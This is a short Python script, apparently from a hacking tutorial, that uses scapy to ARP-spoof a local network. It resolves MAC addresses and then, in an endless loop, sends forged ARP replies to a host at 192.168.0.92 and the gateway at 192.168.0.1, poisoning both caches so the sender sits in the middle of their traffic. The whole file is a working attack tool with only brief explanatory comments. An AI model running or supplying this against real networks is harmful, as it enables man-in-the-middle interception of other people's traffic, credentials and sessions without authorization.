import scapy.all as scapy
import time

def get_mac(ip):
    # This will allow us to create an ARP reqest ( who is x.x.x.x)
    arp_request= scapy.ARP(pdst=ip)

    # This section is creating a Ethernet frame that we can send
    # over the network. We are setting the destination mac in the
    # field.
    broadcast= scapy.Ether(dst= 'ff:ff:ff:ff:ff:ff')

    # This section will combine arp request with out Ethernet frame
    arp_request_broadcast= broadcast/arp_request

    # This nex section will allow us to send our ethernet frame
    answered_list= scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #
    return (answered_list[0][1].hwsrc)


# First field I am going to set is the op field.
# Set to 1 by default which mean when you create
# an arp packet you will create an arpp request.
# We will set it to 2 which will change it to a
# response.
def spoof(target_ip, spoof_ip):
    target_mac= get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    scapy.send(packet, verbose= False)

if __name__ == "__main__":
    sent_packet_count= 0
    while True:
        spoof("192.168.0.92", "192.168.0.1")
        spoof("192.168.0.1", "192.168.0.92")
        sent_packet_count+= 2
        print("Packet Sent: ", str(sent_packet_count))
        time.sleep(2)